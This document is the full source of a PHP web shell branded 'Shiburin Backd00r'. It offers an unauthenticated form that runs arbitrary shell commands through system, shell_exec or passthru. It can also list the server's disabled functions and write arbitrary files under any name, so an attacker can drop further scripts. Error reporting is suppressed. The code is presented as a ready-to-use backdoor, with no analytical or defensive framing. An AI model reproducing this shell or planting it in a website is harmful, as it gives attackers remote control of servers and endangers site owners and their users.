<html>
<head>
<title>Shiburin Backd00r</title>
<style type="text/css">
@import url(https://fonts.googleapis.com/css?family=Iceland);
	body {
		font-family: 'Iceland';
	}
	input[type=text] {
		width: 38.7%;
		background-color: #b8b7b7;
		border: 2px dotted black;
		color: #19863f;
	}
	input[type=submit] {
		height: 25px;
		border: 2px dotted black;
	}
	textarea {
		width: 45%;
		height: 50%;
		background-color: #b8b7b7;
		border: 2px dotted black;
		color: #19863f;
	}
	h1 {
		text-shadow: #19863f 0px 0px 2px;
	}
	a {
		text-decoration: none;
		background-color: #f0f0f0;
		font-size: 20;
		border: 2px dotted black;
		color: black;
	} fieldset {
		width: 35%;
		height: 40px;
	}
</style>
</head>
<body>
<center>
<table width="100%" height="100%"><td align="center">
<i><h1>Shiburin Backd00r</h1></i>
<form method="post">
<input type="text" name="command">
<input type="submit" value="EKSE CMD">
</form>
<a href="?disable_func">&nbsp;SEEDF&nbsp;</a>&nbsp;<a href="?system">&nbsp;SYSTEM&nbsp;</a>&nbsp;<a href="?shell_exec">&nbsp;SHELL_EXEC&nbsp;</a>&nbsp;<a href="?passthru">&nbsp;PASSTHRU&nbsp;</a>&nbsp;<a href="?mkfile">&nbsp;MKFILE&nbsp;</a>
<br><br>
<?php
//Author : Rommy Maulana
//FB : fb.com/UndeathRommy
//Github: github.com/rommymaul
error_reporting(0);
$command = $_POST['command'];
echo "<textarea>";
if(isset($_GET['system'])) {
echo system($command);
} elseif(isset($_GET['shell_exec'])) {
echo shell_exec($command);
} elseif(isset($_GET['passthru'])) {
echo passthru($command);
} elseif(isset($_GET['disable_func'])) {
echo ini_get('disable_functions');
}
echo "</textarea>";

if(isset($_GET['mkfile'])) {
	echo "<br><br><form method='post'>";
	echo "<textarea name='isi' style='width: 25%; height: 150px;'>";
	echo "</textarea><br><input name='namafile' style='width:20.9%; margin-top:5px' type='text' name='file' value='filename.php'> <input type='submit' value='SAVE'></form>";
	if($_POST==true) {
	$isi = $_POST['isi'];
	$namafile = $_POST['namafile'];
	$buat = fopen($namafile,"w");
	fwrite($buat, $isi);
	fclose($buat);
	if($buat == true) {
		echo "<font size='5' style='text-shadow:#19863f 0px 0px 2px'>File Sukses Dibuat!</font>";
	} else {
		echo "<font size='5' style='text-shadow:#19863f 0px 0px 2px'>Gagal Membuat File!</font>";
	}
}
}

?>
<br>
<br>
</td>
</table>
</center>
</body>
</html>